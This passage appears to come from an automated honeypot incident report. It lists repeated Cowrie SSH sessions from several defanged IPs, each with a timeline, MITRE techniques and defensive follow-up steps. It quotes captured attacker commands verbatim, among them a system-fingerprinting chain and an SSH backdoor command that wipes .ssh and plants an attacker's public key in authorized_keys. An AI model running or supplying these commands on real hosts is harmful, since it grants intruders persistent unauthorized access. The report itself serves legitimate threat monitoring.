| `2026-07-06 05:48:57` | `cowrie.command.success` |
| `2026-07-06 05:48:57` | `cowrie.command.input` |
| `2026-07-06 05:48:57` | `cowrie.command.input` |
| `2026-07-06 05:48:57` | `cowrie.command.input` |
| `2026-07-06 05:48:57` | `cowrie.command.input` |
| `2026-07-06 05:48:58` | `cowrie.log.closed` |
| `2026-07-06 05:48:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2733a7ed7eb7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:49 |
| **Last Seen** | 2026-07-06 05:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:49:38` | `cowrie.session.connect` |
| `2026-07-06 05:49:39` | `cowrie.client.version` |
| `2026-07-06 05:49:39` | `cowrie.client.kex` |
| `2026-07-06 05:49:42` | `cowrie.login.success` |
| `2026-07-06 05:49:44` | `cowrie.session.params` |
| `2026-07-06 05:49:44` | `cowrie.command.input` |
| `2026-07-06 05:49:44` | `cowrie.command.input` |
| `2026-07-06 05:49:44` | `cowrie.command.input` |
| `2026-07-06 05:49:44` | `cowrie.command.input` |
| `2026-07-06 05:49:44` | `cowrie.command.input` |
| `2026-07-06 05:49:44` | `cowrie.command.success` |
| `2026-07-06 05:49:44` | `cowrie.command.input` |
| `2026-07-06 05:49:44` | `cowrie.command.input` |
| `2026-07-06 05:49:44` | `cowrie.command.input` |
| `2026-07-06 05:49:44` | `cowrie.command.input` |
| `2026-07-06 05:49:45` | `cowrie.log.closed` |
| `2026-07-06 05:49:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87a1d83bcde1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:50 |
| **Last Seen** | 2026-07-06 05:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:50:25` | `cowrie.session.connect` |
| `2026-07-06 05:50:26` | `cowrie.client.version` |
| `2026-07-06 05:50:26` | `cowrie.client.kex` |
| `2026-07-06 05:50:30` | `cowrie.login.success` |
| `2026-07-06 05:50:32` | `cowrie.session.params` |
| `2026-07-06 05:50:32` | `cowrie.command.input` |
| `2026-07-06 05:50:32` | `cowrie.command.input` |
| `2026-07-06 05:50:32` | `cowrie.command.input` |
| `2026-07-06 05:50:32` | `cowrie.command.input` |
| `2026-07-06 05:50:32` | `cowrie.command.input` |
| `2026-07-06 05:50:32` | `cowrie.command.success` |
| `2026-07-06 05:50:32` | `cowrie.command.input` |
| `2026-07-06 05:50:32` | `cowrie.command.input` |
| `2026-07-06 05:50:32` | `cowrie.command.input` |
| `2026-07-06 05:50:32` | `cowrie.command.input` |
| `2026-07-06 05:50:32` | `cowrie.log.closed` |
| `2026-07-06 05:50:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d00e7e13c992

| Field | Detail |
|---|---|
| **Source IP** | `122.175.36[.]92` |
| **First Seen** | 2026-07-06 05:50 |
| **Last Seen** | 2026-07-06 05:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:50:26` | `cowrie.session.connect` |
| `2026-07-06 05:50:26` | `cowrie.client.version` |
| `2026-07-06 05:50:26` | `cowrie.client.kex` |
| `2026-07-06 05:50:27` | `cowrie.login.success` |
| `2026-07-06 05:50:29` | `cowrie.session.params` |
| `2026-07-06 05:50:29` | `cowrie.command.input` |
| `2026-07-06 05:50:29` | `cowrie.command.failed` |
| `2026-07-06 05:50:29` | `cowrie.log.closed` |
| `2026-07-06 05:50:30` | `cowrie.session.params` |
| `2026-07-06 05:50:30` | `cowrie.command.input` |
| `2026-07-06 05:50:30` | `cowrie.session.file_download` |
| `2026-07-06 05:50:30` | `cowrie.log.closed` |
| `2026-07-06 05:50:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.175.36[.]92` to AbuseIPDB if not already reported
- [ ] Block `122.175.36[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-664dac4d4fd2

| Field | Detail |
|---|---|
| **Source IP** | `122.175.36[.]92` |
| **First Seen** | 2026-07-06 05:50 |
| **Last Seen** | 2026-07-06 05:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:50:30` | `cowrie.session.connect` |
| `2026-07-06 05:50:30` | `cowrie.client.version` |
| `2026-07-06 05:50:31` | `cowrie.client.kex` |
| `2026-07-06 05:50:32` | `cowrie.login.success` |
| `2026-07-06 05:50:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.175.36[.]92` to AbuseIPDB if not already reported
- [ ] Block `122.175.36[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c64d238fa0ac

| Field | Detail |
|---|---|
| **Source IP** | `122.175.36[.]92` |
| **First Seen** | 2026-07-06 05:50 |
| **Last Seen** | 2026-07-06 05:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:50:32` | `cowrie.session.connect` |
| `2026-07-06 05:50:32` | `cowrie.client.version` |
| `2026-07-06 05:50:33` | `cowrie.client.kex` |
| `2026-07-06 05:50:34` | `cowrie.login.success` |
| `2026-07-06 05:50:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.175.36[.]92` to AbuseIPDB if not already reported
- [ ] Block `122.175.36[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca9fbd7a3f25

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:51 |
| **Last Seen** | 2026-07-06 05:51 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:51:12` | `cowrie.session.connect` |
| `2026-07-06 05:51:12` | `cowrie.client.version` |
| `2026-07-06 05:51:12` | `cowrie.client.kex` |
| `2026-07-06 05:51:16` | `cowrie.login.success` |
| `2026-07-06 05:51:18` | `cowrie.session.params` |
| `2026-07-06 05:51:18` | `cowrie.command.input` |
| `2026-07-06 05:51:18` | `cowrie.command.input` |
| `2026-07-06 05:51:18` | `cowrie.command.input` |
| `2026-07-06 05:51:18` | `cowrie.command.input` |
| `2026-07-06 05:51:18` | `cowrie.command.input` |
| `2026-07-06 05:51:18` | `cowrie.command.success` |
| `2026-07-06 05:51:18` | `cowrie.command.input` |
| `2026-07-06 05:51:18` | `cowrie.command.input` |
| `2026-07-06 05:51:18` | `cowrie.command.input` |
| `2026-07-06 05:51:18` | `cowrie.command.input` |
| `2026-07-06 05:51:19` | `cowrie.log.closed` |
| `2026-07-06 05:51:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fec0f279967d

| Field | Detail |
|---|---|
| **Source IP** | `158.180.79[.]132` |
| **First Seen** | 2026-07-06 05:51 |
| **Last Seen** | 2026-07-06 05:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:51:45` | `cowrie.session.connect` |
| `2026-07-06 05:51:45` | `cowrie.client.version` |
| `2026-07-06 05:51:45` | `cowrie.client.kex` |
| `2026-07-06 05:51:46` | `cowrie.login.success` |
| `2026-07-06 05:51:47` | `cowrie.session.params` |
| `2026-07-06 05:51:47` | `cowrie.command.input` |
| `2026-07-06 05:51:47` | `cowrie.command.failed` |
| `2026-07-06 05:51:48` | `cowrie.log.closed` |
| `2026-07-06 05:51:49` | `cowrie.session.params` |
| `2026-07-06 05:51:49` | `cowrie.command.input` |
| `2026-07-06 05:51:49` | `cowrie.session.file_download` |
| `2026-07-06 05:51:49` | `cowrie.log.closed` |
| `2026-07-06 05:51:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.180.79[.]132` to AbuseIPDB if not already reported
- [ ] Block `158.180.79[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15b83ffae1c0

| Field | Detail |
|---|---|
| **Source IP** | `158.180.79[.]132` |
| **First Seen** | 2026-07-06 05:51 |
| **Last Seen** | 2026-07-06 05:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:51:49` | `cowrie.session.connect` |
| `2026-07-06 05:51:49` | `cowrie.client.version` |
| `2026-07-06 05:51:49` | `cowrie.client.kex` |
| `2026-07-06 05:51:50` | `cowrie.login.success` |
| `2026-07-06 05:51:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.180.79[.]132` to AbuseIPDB if not already reported
- [ ] Block `158.180.79[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca5810580a77

| Field | Detail |
|---|---|
| **Source IP** | `158.180.79[.]132` |
| **First Seen** | 2026-07-06 05:51 |
| **Last Seen** | 2026-07-06 05:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:51:50` | `cowrie.session.connect` |
| `2026-07-06 05:51:50` | `cowrie.client.version` |
| `2026-07-06 05:51:51` | `cowrie.client.kex` |
| `2026-07-06 05:51:51` | `cowrie.login.success` |
| `2026-07-06 05:51:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.180.79[.]132` to AbuseIPDB if not already reported
- [ ] Block `158.180.79[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97eb1db21d64

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:51 |
| **Last Seen** | 2026-07-06 05:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:51:59` | `cowrie.session.connect` |
| `2026-07-06 05:52:00` | `cowrie.client.version` |
| `2026-07-06 05:52:00` | `cowrie.client.kex` |
| `2026-07-06 05:52:03` | `cowrie.login.success` |
| `2026-07-06 05:52:05` | `cowrie.session.params` |
| `2026-07-06 05:52:05` | `cowrie.command.input` |
| `2026-07-06 05:52:05` | `cowrie.command.input` |
| `2026-07-06 05:52:05` | `cowrie.command.input` |
| `2026-07-06 05:52:05` | `cowrie.command.input` |
| `2026-07-06 05:52:05` | `cowrie.command.input` |
| `2026-07-06 05:52:05` | `cowrie.command.success` |
| `2026-07-06 05:52:05` | `cowrie.command.input` |
| `2026-07-06 05:52:05` | `cowrie.command.input` |
| `2026-07-06 05:52:05` | `cowrie.command.input` |
| `2026-07-06 05:52:05` | `cowrie.command.input` |
| `2026-07-06 05:52:06` | `cowrie.log.closed` |
| `2026-07-06 05:52:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98b6aa64928a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:52 |
| **Last Seen** | 2026-07-06 05:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:52:46` | `cowrie.session.connect` |
| `2026-07-06 05:52:46` | `cowrie.client.version` |
| `2026-07-06 05:52:46` | `cowrie.client.kex` |
| `2026-07-06 05:52:50` | `cowrie.login.success` |
| `2026-07-06 05:52:52` | `cowrie.session.params` |
| `2026-07-06 05:52:52` | `cowrie.command.input` |
| `2026-07-06 05:52:52` | `cowrie.command.input` |
| `2026-07-06 05:52:52` | `cowrie.command.input` |
| `2026-07-06 05:52:52` | `cowrie.command.input` |
| `2026-07-06 05:52:52` | `cowrie.command.input` |
| `2026-07-06 05:52:52` | `cowrie.command.success` |
| `2026-07-06 05:52:52` | `cowrie.command.input` |
| `2026-07-06 05:52:52` | `cowrie.command.input` |
| `2026-07-06 05:52:52` | `cowrie.command.input` |
| `2026-07-06 05:52:52` | `cowrie.command.input` |
| `2026-07-06 05:52:52` | `cowrie.log.closed` |
| `2026-07-06 05:52:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-153c43bdf806

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:53 |
| **Last Seen** | 2026-07-06 05:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:53:33` | `cowrie.session.connect` |
| `2026-07-06 05:53:33` | `cowrie.client.version` |
| `2026-07-06 05:53:33` | `cowrie.client.kex` |
| `2026-07-06 05:53:37` | `cowrie.login.success` |
| `2026-07-06 05:53:39` | `cowrie.session.params` |
| `2026-07-06 05:53:39` | `cowrie.command.input` |
| `2026-07-06 05:53:39` | `cowrie.command.input` |
| `2026-07-06 05:53:39` | `cowrie.command.input` |
| `2026-07-06 05:53:39` | `cowrie.command.input` |
| `2026-07-06 05:53:39` | `cowrie.command.input` |
| `2026-07-06 05:53:39` | `cowrie.command.success` |
| `2026-07-06 05:53:39` | `cowrie.command.input` |
| `2026-07-06 05:53:39` | `cowrie.command.input` |
| `2026-07-06 05:53:39` | `cowrie.command.input` |
| `2026-07-06 05:53:39` | `cowrie.command.input` |
| `2026-07-06 05:53:40` | `cowrie.log.closed` |
| `2026-07-06 05:53:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51eeceb99d94

| Field | Detail |
|---|---|
| **Source IP** | `46.38.146[.]46` |
| **First Seen** | 2026-07-06 05:53 |
| **Last Seen** | 2026-07-06 05:53 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:53:53` | `cowrie.session.connect` |
| `2026-07-06 05:53:53` | `cowrie.client.version` |
| `2026-07-06 05:53:53` | `cowrie.client.kex` |
| `2026-07-06 05:53:54` | `cowrie.login.success` |
| `2026-07-06 05:53:54` | `cowrie.session.params` |
| `2026-07-06 05:53:54` | `cowrie.command.input` |
| `2026-07-06 05:53:54` | `cowrie.command.failed` |
| `2026-07-06 05:53:55` | `cowrie.log.closed` |
| `2026-07-06 05:53:56` | `cowrie.session.params` |
| `2026-07-06 05:53:56` | `cowrie.command.input` |
| `2026-07-06 05:53:56` | `cowrie.session.file_download` |
| `2026-07-06 05:53:56` | `cowrie.log.closed` |
| `2026-07-06 05:53:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.38.146[.]46` to AbuseIPDB if not already reported
- [ ] Block `46.38.146[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3eb324497e4

| Field | Detail |
|---|---|
| **Source IP** | `46.38.146[.]46` |
| **First Seen** | 2026-07-06 05:53 |
| **Last Seen** | 2026-07-06 05:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:53:56` | `cowrie.session.connect` |
| `2026-07-06 05:53:56` | `cowrie.client.version` |
| `2026-07-06 05:53:56` | `cowrie.client.kex` |
| `2026-07-06 05:53:57` | `cowrie.login.success` |
| `2026-07-06 05:53:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.38.146[.]46` to AbuseIPDB if not already reported
- [ ] Block `46.38.146[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4109af830592

| Field | Detail |
|---|---|
| **Source IP** | `46.38.146[.]46` |
| **First Seen** | 2026-07-06 05:53 |
| **Last Seen** | 2026-07-06 05:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:53:57` | `cowrie.session.connect` |
| `2026-07-06 05:53:57` | `cowrie.client.version` |
| `2026-07-06 05:53:57` | `cowrie.client.kex` |
| `2026-07-06 05:53:58` | `cowrie.login.success` |
| `2026-07-06 05:53:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.38.146[.]46` to AbuseIPDB if not already reported
- [ ] Block `46.38.146[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a14f4db9d72

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:54 |
| **Last Seen** | 2026-07-06 05:54 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
